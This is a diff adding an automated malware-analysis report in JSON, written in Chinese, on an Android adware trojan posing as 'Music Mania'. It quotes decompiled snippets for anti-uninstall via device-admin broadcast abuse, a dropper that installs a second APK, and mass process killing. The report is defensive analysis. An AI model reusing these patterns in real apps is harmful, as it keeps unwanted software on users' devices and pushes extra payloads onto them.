@@ -1,0 +1,191 @@
+{
+  "APK信息": {
+    "文件名": "28c54efc1cebeebd75c0f670c2096d02303620eba1e5cf60c0076da3bd9e7ec5.apk",
+    "sha256": "28c54efc1cebeebd75c0f670c2096d02303620eba1e5cf60c0076da3bd9e7ec5",
+    "包名": "com.baasdajie.zhofsdng",
+    "应用名": "Music Mania",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 946.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lreceivers\\AdminReceiver;",
+          "method_signature": "onDisableRequested(Context context, Intent intent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public class AdminReceiver extends DeviceAdminReceiver {\n    public CharSequence onDisableRequested(Context context, Intent intent) {\n        abortBroadcast();\n        return \"\";\n    }\n    public void onDisabled(Context context, Intent intent) {\n        abortBroadcast();\n    }\n}",
+          "malicious_code_snippet_context": "  import android.content.Intent;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class AdminReceiver extends DeviceAdminReceiver {\n>>>     @Override // android.app.admin.DeviceAdminReceiver\n>>>     public void onEnabled(Context context, Intent intent) {\n>>>         super.onEnabled(context, intent);\n>>>     }\n>>> \n>>>     @Override // android.app.admin.DeviceAdminReceiver\n>>>     public CharSequence onDisableRequested(Context context, Intent intent) {\n>>>         abortBroadcast();\n          return \"\";\n      }\n  ",
+          "behavior_description": "该类继承 DeviceAdminReceiver，是 Hiddad 木马利用设备管理员权限实现防卸载的自保护组件，并非短信拦截。数据流向：系统设备管理员生命周期广播→ onDisableRequested()/onDisabled() 回调 → abortBroadcast() + 返回空字符串。需要指出：abortBroadcast() 在 DeviceAdminReceiver 回调上下文中并不处于短信有序广播（SMS_RECEIVED/SMS_DELIVER）流程，无法拦截短信，检测引擎将其模式匹配为 sms_intercept 属于上下文误判；其真实作用是干扰停用请求广播流程并隐藏停用设备管理员时的警告提示（返回 \"\"），使用户难以停用/卸载应用，木马得以持久驻留继续弹出广告和欺诈行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ad_fraud",
+      "中文名": "广告欺诈",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "hidden_ad",
+          "中文名": "隐藏广告",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "Interstitial",
+              "loadAd",
+              "showAd",
+              "adView",
+              "Banner"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lads\\AdmobInterstitial;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "ad_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public class AdmobInterstitial extends AdListener {\n    private static String adUnitId = \"ADS_INTERSTITIAL_ID\";\n    private Context activity;\n    public InterstitialAd interstitial;\n\n    public AdmobInterstitial(Context activity, String adUnitId2) {\n        adUnitId = adUnitId2;\n    }\n}",
+          "malicious_code_snippet_context": "  import com.google.android.gms.ads.InterstitialAd;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class AdmobInterstitial extends AdListener {\n>>>     private static String adUnitId = \"ADS_INTERSTITIAL_ID\";\n>>>     private Context activity;\n>>>     public InterstitialAd interstitial;\n>>>     private PreferencesHelper prefHelper;\n>>> \n>>>     public AdmobInterstitial(Context activity, String adUnitId2) {\n>>>         adUnitId = adUnitId2;\n>>>         this.activity = activity;\n          this.prefHelper = new PreferencesHelper(activity);\n      }\n  ",
+          "behavior_description": "该类位于应用自身的 ads 包中（并非 Google 官方库内部代码），是对 AdMob InterstitialAd 全屏插页广告的封装。构造函数接收 Activity 的 Context 与广告单元 ID，初始化全屏插页广告对象用于后续加载和展示。结合厂商报告（ESET 检出为 Android/Hiddad.BZ，一款诱导用户刷好评的激进广告木马），该封装类是隐藏广告欺诈的实现载体，数据流向为：外部传入的广告单元 ID 与 Context（source）→ InterstitialAd 全屏插页广告加载/展示（sink）。Hiddad 类样本的典型手法是在息屏、锁屏或应用后台等用户无感知的时机触发全屏广告展示，从而在用户不知情的情况下刷取广告展示量，消耗用户流量与电量并为攻击者牟利，属于广告欺诈/隐藏广告行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\test\\acleaner\\sActivity;",
+          "method_signature": "if(!sActivity.this.AppInstalled(sActivity.this.ApplicationID)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (!sActivity.this.AppInstalled(sActivity.this.ApplicationID)) {\n    sActivity.this.CopyFile(sActivity.this.mFile);\n    Intent intent = new Intent(\"android.intent.action.VIEW\");\n    intent.setDataAndType(Uri.fromFile(sActivity.this.mFile), \"application/vnd.android.package-archive\");\n    sActivity.this.startActivity(intent);\n} else {\n    Intent intent2 = new Intent();\n    intent2.setComponent(new ComponentName(sActivity.this.ApplicationID, sActivity.this.MainLaunchActivity));\n    intent2.putExtra(\"app_packagename\", sActivity.this.getPackageName());\n    intent2.setFlags(268435456);\n    sActivity.this.startActivity(intent2);\n    sActivity.this.finish();\n}",
+          "malicious_code_snippet_context": "              @Override // android.content.BroadcastReceiver\n              public void onReceive(Context context, Intent inte) {\n                  try {\n>>>                     if (!sActivity.this.AppInstalled(sActivity.this.ApplicationID)) {\n>>>                         sActivity.this.CopyFile(sActivity.this.mFile);\n>>>                         Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>                         intent.setDataAndType(Uri.fromFile(sActivity.this.mFile), \"application/vnd.android.package-archive\");\n>>>                         sActivity.this.startActivity(intent);\n>>>                     } else {\n>>>                         Intent intent2 = new Intent();\n>>>                         intent2.setComponent(new ComponentName(sActivity.this.ApplicationID, sActivity.this.MainLaunchActivity));\n>>>                         intent2.putExtra(\"app_title\", sActivity.this.getString(R.string.app_name));\n>>>                         intent2.putExtra(\"app_packagename\", sActivity.this.getPackageName());\n>>>                         intent2.setFlags(268435456);\n>>>                         sActivity.this.startActivity(intent2);\n>>>                         sActivity.this.finish();\n                      }\n                      sActivity.this.CopyFile(sActivity.this.mFile);\n                  } catch (Exception e) {",
+          "behavior_description": "该代码位于动态注册的广播接收器 onReceive 中，构成投放器逻辑：首先检测指定包名的目标应用是否已安装；若未安装，则将APK文件复制到本地存储，随即通过 ACTION_VIEW + application/vnd.android.package-archive MIME 类型调起系统安装界面，在用户无预期的情况下（配合ESET报告所述的社会工程欺骗手段）诱导安装第二个APK载荷；若已安装，则直接通过 ComponentName 启动该载荷应用的主 Activity，并携带自身包名等参数用于关联。数据流向：本地复制的APK文件→调起系统包安装器执行安装。结合厂商报告确认该样本为 Android/Hiddad.BZ 攻击性广告木马，此代码正是其向用户设备推送并安装额外恶意载荷的核心机制，属于恶意投放行为。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\test\\acleaner\\AppActivity;",
+          "method_signature": "onCreate(Bundle savedInstanceState)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "desintalarApps();\nthis.detectarAppDelete = new AppDeleted();\nthis.filter = new IntentFilter(\"android.intent.action.PACKAGE_ADDED\");\nthis.filter.addAction(\"android.intent.action.PACKAGE_REMOVED\");\nthis.filter.addAction(\"android.intent.action.DELETE\");\nthis.filter.addDataScheme(\"package\");\nregisterReceiver(this.detectarAppDelete, this.filter);",
+          "malicious_code_snippet_context": "          barraTitulo();\n          cargarAplicaciones();\n          iniciarHilo();\n>>>         desintalarApps();\n>>>         this.detectarAppDelete = new AppDeleted();\n>>>         this.filter = new IntentFilter(\"android.intent.action.PACKAGE_ADDED\");\n>>>         this.filter.addAction(\"android.intent.action.PACKAGE_REMOVED\");\n>>>         this.filter.addAction(\"android.intent.action.DELETE\");\n>>>         this.filter.addDataScheme(\"package\");\n>>>         registerReceiver(this.detectarAppDelete, this.filter);\n          this.intentFilter = new IntentFilter();\n          this.intentFilter.addAction(\"QUITAR\");\n          registerReceiver(this.intentReceiver, this.intentFilter);",
+          "behavior_description": "在Activity的onCreate中调用desintalarApps()执行应用卸载操作，同时注册广播接收器AppDeleted监听PACKAGE_ADDED、PACKAGE_REMOVED和ACTION_DELETE三种包管理事件（dataScheme为package），持续监控设备上所有应用的安装、卸载与删除动作。该样本已被ESET确认为Android/Hiddad.BZ木马（伪装成清理工具的攻击性广告木马），其卸载功能与包事件监控可能被用于移除安全软件或竞争应用，并可在自身被删除时触发相应逻辑。数据流向：系统package变更广播事件(source)→应用卸载操作desintalarApps()及包删除事件响应(sink)",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killBackgroundProcesses",
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\test\\acleaner\\CPUTemperature_Fragment;",
+          "method_signature": "for(int k = 0; k < info.pkgList.length; k++)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "ActivityManager activityManager = (ActivityManager) activity.getSystemService(\"activity\");\nActivityManager.RunningAppProcessInfo info = (ActivityManager.RunningAppProcessInfo) CPUTemperature_Fragment.this.listRunningAppProcessInfo.get(i);\nfor (int k = 0; k < info.pkgList.length; k++) {\n    activityManager.killBackgroundProcesses(info.pkgList[k]);\n}\nProcess.killProcess(info.pid);",
+          "malicious_code_snippet_context": "                              cadena.append(((InfoAppOnRam) CPUTemperature_Fragment.this.appsList.get(i)).getAppName()).append(\"\\n\");\n                              Activity activity = CPUTemperature_Fragment.this.activity;\n                              Activity unused = CPUTemperature_Fragment.this.activity;\n>>>                             ActivityManager activityManager = (ActivityManager) activity.getSystemService(\"activity\");\n>>>                             ActivityManager.RunningAppProcessInfo info = (ActivityManager.RunningAppProcessInfo) CPUTemperature_Fragment.this.listRunningAppProcessInfo.get(i);\n>>>                             for (int k = 0; k < info.pkgList.length; k++) {\n>>>                                 activityManager.killBackgroundProcesses(info.pkgList[k]);\n>>>                             }\n>>>                             Process.killProcess(info.pid);\n                          }\n                      }\n                  });",
+          "behavior_description": "该代码是伪装成'CPU降温/内存优化'工具的清理逻辑：通过ActivityManager获取设备当前所有运行中的应用进程列表（source），遍历每个进程的pkgList包名，逐一调用killBackgroundProcesses()批量杀死其他应用的后台进程，并额外调用Process.killProcess()尝试按PID强杀进程（sink）。这种无差别杀进程行为会干扰其他应用正常运行（中断下载、播放、同步等），且'优化'动作与广告展示ShowAd()绑定，属于广告类灰色软件的虚假优化功能：制造清理假象以诱导用户反复使用并观看广告，并非直接窃取隐私或破坏数据的恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
